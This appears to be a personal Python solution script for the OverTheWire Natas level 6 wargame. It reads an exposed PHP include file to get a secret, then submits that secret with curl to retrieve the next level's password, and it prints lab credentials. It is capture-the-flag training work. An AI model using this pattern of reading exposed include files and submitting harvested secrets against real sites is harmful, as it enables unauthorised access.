# Natas Level 5 → Level 6
# Username: natas6
# URL:      http://natas6.natas.labs.overthewire.org


#  basically first found the source code

# Source code :

# http://natas6.natas.labs.overthewire.org/index-source.html 

# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
# <body>
# <h1>natas6</h1>
# <div id="content">

# <?

# include "includes/secret.inc";                       

#     if(array_key_exists("submit", $_POST)) {
#         if($secret == $_POST['secret']) {
#         print "Access granted. The password for natas7 is <censored>";
#     } else {
#         print "Wrong secret";
#     }
#     }
# ?>

# <form method=post>
# Input secret: <input name=secret><br>
# <input type=submit name=submit>
# </form>

# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>



# -----------------------------------

# imp block from source code

# include "includes/secret.inc";                       

#     if(array_key_exists("submit", $_POST)) {
#         if($secret == $_POST['secret']) {
#         print "Access granted. The password for natas7 is <censored>";
#     } else {
#         print "Wrong secret";
#     }
#     }
# ?>
# ----------------------

# contents of the inc folder
# http://natas6.natas.labs.overthewire.org/includes/secret.inc

# <?
# $secret = "FOEIUWGHFEEUHOFUOIU";
# ?>

# ---------------------
# Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
# -------------------------

# curl -d to save headers
# curl -D tp send data to servers can be uised to submit specific forms


# --------- use this and just run regex on it to get natas7 pass
# curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned   -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" "http://natas6.natas.labs.overthewire.org/" | sed -n '1,200p'


import subprocess

import sys

import re

def main():

    # print("i am main")

    command=''' curl -s -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" "http://natas6.natas.labs.overthewire.org/" | sed -n "1,200p" '''

    try:
        # spawn the shell
        result=subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=True
        )

        if result.stdout:
            # extract the natas 7 
            match=re.search(r'password for natas7 is ([A-za-z0-98]+)',result.stdout)

            # print(result.stdout)
            # print the stuff
            print(match.group(0))   
        else :
            print("No result found")            
    
    # error handling just inm case
    except subprocess.CalledProcessError as e:
        print(f"Command failed with exit code {e.returncode}")
        if e.stderr:
            print({f"Error : {e.stderr}"})
        sys.exit(1) # need to exit the sppwasned shell
    except FileNotFoundError :
        print("error curl might not be installed ...")
        sys.exit(1)

if __name__=="__main__":
    main()    



# password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS